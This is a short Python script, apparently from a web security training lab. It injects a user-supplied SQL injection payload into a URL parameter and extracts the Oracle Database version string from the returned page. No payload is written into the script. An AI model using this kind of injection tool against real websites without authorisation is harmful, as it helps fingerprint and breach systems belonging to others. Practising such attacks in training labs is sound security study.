import requests
from bs4 import BeautifulSoup
import re
import sys

try:
	url = input("Enter the URL: ")
	parameter = input("Enter parameter: ")
	payload = input("Enter payload: ")

	headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0'}

	full_url = f"{url}?{parameter}={payload}"
	#print(full_url)

	#Making a request to the url
	response = requests.get(full_url, headers=headers)

	#Use beautiful soup to parse the HTML Content recieved from the previouse request
	soup = BeautifulSoup(response.text, 'html.parser')

	#print(soup)

	#Find the tbody tag
	tbody_tag = soup.find('tbody')

	#Extract and print the text inside of tbody if found
	if tbody_tag:
		tbody_text = tbody_tag.get_text(separator='\n', strip=True)
		#print(tbody_text)

		#Extracting only the Oracle Database version
		pattern = r'^Oracle Database.*'
		matches = re.findall(pattern, tbody_text, re.MULTILINE)

		if matches:
			for match in matches:
				print(match)

		else:
			print("Oracle Database Version not found.")

	else:
		print("Lab not Solved. Injection not successfull.")


except requests.exceptions.RequestException as e:
	print(f"An Error has Occured: ")

except KeyboardInterrupt:
	print("\nProgram Interrupted by user. ")
	sys.exit()